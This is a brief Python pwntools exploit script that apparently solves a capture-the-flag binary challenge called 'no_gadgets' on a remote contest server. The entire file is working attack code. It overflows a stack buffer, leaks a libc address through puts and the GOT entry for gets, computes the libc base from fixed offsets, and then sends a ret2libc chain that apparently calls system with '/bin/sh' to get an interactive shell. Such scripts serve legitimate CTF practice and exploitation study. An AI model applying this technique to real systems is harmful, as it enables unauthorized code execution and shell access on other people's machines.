from pwn import *

context.binary = elf = ELF('./no_gadgets')

# p = process(elf.path)

p = remote("chall.nitdgplug.org", 30081)

payload = flat(
    elf.symbols['puts'],
    elf.symbols['main'],
    elf.got['gets']
)

p.sendlineafter("think ?\n", "A" * 44 + "B" * 8 + payload)

leak = u32(p.recv(4))
libc_base = leak - 0x05e8a0
print(hex(libc_base))

payload = flat(
    libc_base + 0x03a950,
    libc_base + 0x002e7c0,
    libc_base + 0x15910b
)

p.sendlineafter("think ?\n", "A" * 44 + "B" * 8 + payload)

p.interactive()

